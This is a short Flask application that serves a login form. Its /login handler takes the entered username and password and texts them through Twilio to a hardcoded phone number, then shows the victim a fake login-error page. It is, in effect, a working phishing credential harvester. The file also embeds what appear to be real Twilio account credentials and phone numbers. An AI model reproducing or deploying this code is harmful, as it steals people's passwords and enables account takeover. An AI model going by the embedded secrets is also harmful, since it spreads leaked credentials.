from flask import Flask, render_template, request, redirect
from twilio.rest import Client
import os

app = Flask(__name__)

@app.route('/',methods=['POST', 'GET'])
def index():
    # return "Hello World"
    return render_template('index.html')

@app.route('/login_error',methods=['POST', 'GET'])
def login_error():
    return render_template('submit.html')

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method=='POST':
        l_email = request.form['username']
        l_pass = request.form['password']
        if not l_email or not l_pass:
            return redirect('/')
        else:
            sender_name = "New User"
            sender_email = l_email
            sender_password = l_pass

            account_sid = 'AC7b7eba1c290afbf3365bc5139e0b956a' 
            auth_token = '6d2df186f888a5ceac833b2661fa49a7' 
            client = Client(account_sid, auth_token) 
            message = client.messages.create( 
                                        from_='+18148854900',  
                                        body=f'{sender_name}\n{sender_email}\n{sender_password}',      
                                        to='+917319865341') 
            print("Success")
            return redirect('/login_error')
    else:
        return redirect('/')


if __name__ == '__main__':
    app.run(debug=True, port=os.getenv("PORT", default=5000))
